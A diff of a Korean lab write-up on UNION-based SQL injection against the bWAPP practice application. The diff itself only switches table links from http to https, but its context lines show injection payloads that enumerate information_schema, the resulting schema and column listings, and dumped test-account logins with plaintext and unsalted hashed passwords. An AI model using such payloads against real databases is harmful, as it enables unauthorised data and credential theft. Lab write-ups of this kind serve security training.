@@ -111,17 +111,17 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 'AND 1=0 UNION SELECT 1,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.SCHEMATA #
 ```
 
-| information_schema |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| information_schema |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
 | --- | --- | --- | --- | --- |
 
-| bWAPP |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| bWAPP |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
-| drupageddon |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| drupageddon |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
-| mysql |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| mysql |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
-| testdb |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| testdb |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
 **`information_schema`****는 MySQL의 데이터베이스·테이블·컬럼·권한 같은 구조 정보를 조회하는 메타데이터용 데이터베이스**
 
@@ -180,13 +180,13 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 ' UNION SELECT 1,TABLE_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.TABLES WHERE TABLE_SCHEMA='testdb' #
 ```
 
-| cisco |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| cisco |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
 | --- | --- | --- | --- | --- |
 
-| linux |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| linux |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
-| security |  |  |  | [**Link**](http://www.imdb.com/title/) |
+| security |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
 3.5 cisco 테이블의 구조를 information_schema 테이블에 저장된 schema (데이터베이스 목록). columns를 조회
 
@@ -221,17 +221,17 @@ security
 
 linux 테이블 컬럼 구조 
 
-| linux | id |  | int | [**Link**](http://www.imdb.com/title/) |
+| linux | id |  | int | [**Link**](https://www.imdb.com/title/) |
 
 | --- | --- | --- | --- | --- |
 
-| linux | login |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| linux | login |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| linux | password |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| linux | password |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| linux | username |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| linux | username |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| linux | age |  | int | [**Link**](http://www.imdb.com/title/) |
+| linux | age |  | int | [**Link**](https://www.imdb.com/title/) |
 
 cisco 테이블 컬럼 구조 
 
@@ -239,15 +239,15 @@ cisco 테이블 컬럼 구조
 
 | --- | --- | --- | --- | --- |
 
-| cisco | id |  | int | [**Link**](http://www.imdb.com/title/) |
+| cisco | id |  | int | [**Link**](https://www.imdb.com/title/) |
 
-| cisco | login |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| cisco | login |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| cisco | password |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| cisco | password |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| cisco | username |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| cisco | username |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| cisco | age |  | int | [**Link**](http://www.imdb.com/title/) |
+| cisco | age |  | int | [**Link**](https://www.imdb.com/title/) |
 
 security 테이블 컬럼 구조 
 
@@ -255,15 +255,15 @@ security 테이블 컬럼 구조
 
 | --- | --- | --- | --- | --- |
 
-| security | id |  | int | [**Link**](http://www.imdb.com/title/) |
+| security | id |  | int | [**Link**](https://www.imdb.com/title/) |
 
-| security | login |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| security | login |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| security | password |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| security | password |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| security | username |  | varchar | [**Link**](http://www.imdb.com/title/) |
+| security | username |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
-| security | age |  | int | [**Link**](http://www.imdb.com/title/) |
+| security | age |  | int | [**Link**](https://www.imdb.com/title/) |
 
 **5. 확인된 컬럼으로 데이터 조회**
 
@@ -287,11 +287,11 @@ cisco는 실제로 확인한 login, password, username을 사용한다.
 
 | --- | --- | --- | --- | --- |
 
-| cisco1 | cisco1111 |  | kim jung woo | [**Link**](http://www.imdb.com/title/) |
+| cisco1 | cisco1111 |  | kim jung woo | [**Link**](https://www.imdb.com/title/) |
 
-| cisco2 | cisco2222 |  | kim jung soo | [**Link**](http://www.imdb.com/title/) |
+| cisco2 | cisco2222 |  | kim jung soo | [**Link**](https://www.imdb.com/title/) |
 
-| cisco3 | cisco3333 |  | kim jung ah | [**Link**](http://www.imdb.com/title/) |
+| cisco3 | cisco3333 |  | kim jung ah | [**Link**](https://www.imdb.com/title/) |
 
 linux
 
@@ -303,11 +303,11 @@ linux
 
 | --- | --- | --- | --- | --- |
 
-| linux1 | 1fee615b09949f90b702519072e45afa |  | lee jung woo | [**Link**](http://www.imdb.com/title/) |
+| linux1 | 1fee615b09949f90b702519072e45afa |  | lee jung woo | [**Link**](https://www.imdb.com/title/) |
 
-| linux2 | 2ea1acb089a098b871a3fc0dbf059e9b |  | lee jung soo | [**Link**](http://www.imdb.com/title/) |
+| linux2 | 2ea1acb089a098b871a3fc0dbf059e9b |  | lee jung soo | [**Link**](https://www.imdb.com/title/) |
 
-| linux3 | 7aafb1a08847d772dcc54f8255a13949 |  | lee jung ah | [**Link**](http://www.imdb.com/title/) |
+| linux3 | 7aafb1a08847d772dcc54f8255a13949 |  | lee jung ah | [**Link**](https://www.imdb.com/title/) |
 
 최종적으로 해시 패스워드를 얻어냈고 크래킹 결과 sha1계열임과 salt값이 들어가있지 않다는것을 확인할 수 있다. 
 
@@ -345,11 +345,11 @@ linux
 
 | --- | --- | --- | --- | --- |
 
-| security1 | 9da88abdc73b137b86ddee924d572430f54244ca |  | park jung woo | [**Link**](http://www.imdb.com/title/) |
+| security1 | 9da88abdc73b137b86ddee924d572430f54244ca |  | park jung woo | [**Link**](https://www.imdb.com/title/) |
 
-| security2 | 51a3e131329157c7def8130a3a9a882805d58a2e |  | park jung soo | [**Link**](http://www.imdb.com/title/) |
+| security2 | 51a3e131329157c7def8130a3a9a882805d58a2e |  | park jung soo | [**Link**](https://www.imdb.com/title/) |
 
-| security3 | 1537f36e8d10cddce37dd3c2c6ee14f4ed8ebe20 |  | park jung ah | [**Link**](http://www.imdb.com/title/) |
+| security3 | 1537f36e8d10cddce37dd3c2c6ee14f4ed8ebe20 |  | park jung ah | [**Link**](https://www.imdb.com/title/) |
 
 - security1 계정 park jung woo
 
